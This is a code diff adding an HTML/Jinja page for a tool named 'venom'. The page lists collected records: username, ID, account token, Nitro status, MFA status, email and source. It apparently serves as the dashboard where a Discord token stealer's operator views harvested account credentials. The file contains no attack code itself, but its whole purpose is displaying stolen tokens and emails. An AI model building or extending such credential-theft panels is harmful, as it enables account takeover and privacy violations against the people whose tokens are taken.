@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    {% include "parts/head.html" %}
+    <title>venom | {{ get("title.data") }}</title>
+    <link href="/css/data.css" rel="stylesheet">
+  </head>
+  <body>
+    {% include "parts/navbar.html" %}
+    <main class="user">
+      {% include "parts/data_bar.html" %}
+      {% if error %}
+        {% include "parts/error.html" %}
+      {% endif %}
+      {% if results|length == 0 %}
+      <div class="empty">
+        <h1>{{ get('data.empty.title') }}</h1>
+        <p>{{ get('data.empty.msg') }}</p>
+      </div>
+      {% else %}
+        {% include "parts/data_count.html" %}
+        <div class="results">
+          {% for r in results %}
+            <div class="result">
+              <h1>{{ r.User }}</h1>
+              <table class="dark-table">
+                <tr>
+                  <td><strong>🪪 {{ get('data.key.id') }}</strong></td> 
+                  <td><p>{{ r.ID }}</p></td>
+                </tr>
+                <tr>
+                  <td><strong>🔑 {{ get('data.key.token') }}</strong></td> 
+                  <td><p>{{ r.Token }}</p></td>
+                </tr>
+                <tr>
+                  <td><strong>🥳 {{ get('data.key.nitro') }}</strong></td> 
+                  <td><p>{{ r.Nitro }}</p></td>
+                </tr>
+                <tr>
+                  <td><strong>🔐 {{ get('data.key.mfa') }}</strong></td> 
+                  {% if r.MFA %}
+                    <td><p>Yes</p></td>
+                  {% else %}
+                    <td><p>No</p></td>
+                  {% endif %}
+                </tr>
+                <tr>
+                  <td><strong>📨 {{ get('data.key.email') }}</strong></td> 
+                  <td><p>{{ r.Email }}</p></td>
+                </tr>
+                <tr>
+                  <td><strong>📫 {{ get('data.key.from') }}</strong></td> 
+                  <td><p>{{ r.From }}</p></td>
+                </tr>
+              </table>
+            </div>
+          {% endfor %}
+        </div>
+      {% endif %}
+    </main>
+  </body>
+</html>
